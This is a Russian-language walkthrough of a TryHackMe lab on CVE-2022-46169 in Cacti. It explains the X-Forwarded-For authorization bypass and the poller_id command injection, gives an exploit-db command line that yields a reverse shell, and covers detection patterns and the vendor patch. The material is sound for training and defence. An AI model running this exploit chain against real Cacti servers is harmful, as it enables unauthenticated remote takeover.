# Cactus: CVE-2022-46169 — обход авторизации и инъекция в Cacti

**Машина:** [Cactus](https://tryhackme.com/room/cactus) (medium, Linux)
**Суть:** цепочка из двух багов в `remote_agent.php` Cacti < 1.2.23: bypass авторизации через X-Forwarded-For + command injection в `poller_id`. CVSS 9.8, unauthenticated RCE.

## Что ломается

`remote_agent.php` принимает запросы только с адресов из poller-таблицы. Адрес клиента берётся так: сначала смотрится `REMOTE_ADDR`, но если пришёл заголовок `X-Forwarded-For` — берётся он (gethostbyaddr резолвит его в имя и сверяет с таблицей). Заголовок контролирует атакующий — значит, `X-Forwarded-For: 127.0.0.1` проходит проверку.

Дальше `action=polldata` ведёт в `poll_for_data()`. Там два параметра:

```php
$host_id   = get_filter_request_var('host_id');    // только int
$poller_id = get_nfilter_request_var('poller_id');  // любая строка, без фильтра
```

`poller_id` дописывается в команду `proc_open(... script_server.php realtime <poller_id>)` без экранирования. Если в БД есть poller_item с action `POLLER_ACTION_SCRIPT_PHP` (шаблоны "Device - Uptime" и т.п. добавляют его сами), получаем инъекцию.

## Эксплуатация

Сложность в том, что нужны валидные `host_id` и `local_data_ids[]` — id'ы перебираются массивом. Берём Burp Intruder, cluster bomb, числа 1-20 на обе позиции; валидная пара отличается длиной ответа. Дальше готовый эксплойт (EDB 51166), поправив в нём X-Forwarded-For под 127.0.0.1:

```bash
python3 51166.py -u http://TARGET/cacti/ -i IP -p 443
```

Реверс-шелл на слушателе.

## Детект (половина комнаты про это)

IoC простые: GET на `remote_agent.php` с `action=polldata`, `poller_id`, содержащим `bash|sh|powershell|cmd`. В Kibana запрос по этим строкам из url.query отдаёт события с source.ip атакующего. В логах Apache те же следы. Флаг прятался в base64-строке из инъекции — не стал декодить глазами, прогнал через `base64 -d`.

## Патч (что поменяли разработчики)

- `get_nfilter_request_var` → `get_filter_request_var` на poller_id (только int)
- аргументы вокруг `proc_open` завернули в `cacti_escapeshellarg`
- в `get_client_addr` выпилили доверие к HTTP-заголовкам для определения клиентского IP

## Заметка

Комната хороша тем, что это не «запусти эксплойт — получи флаг», а полный цикл: разбор вектора, эксплуатация, поиск в логах, разбор патча. Ради детекта её стоило проходить отдельно.
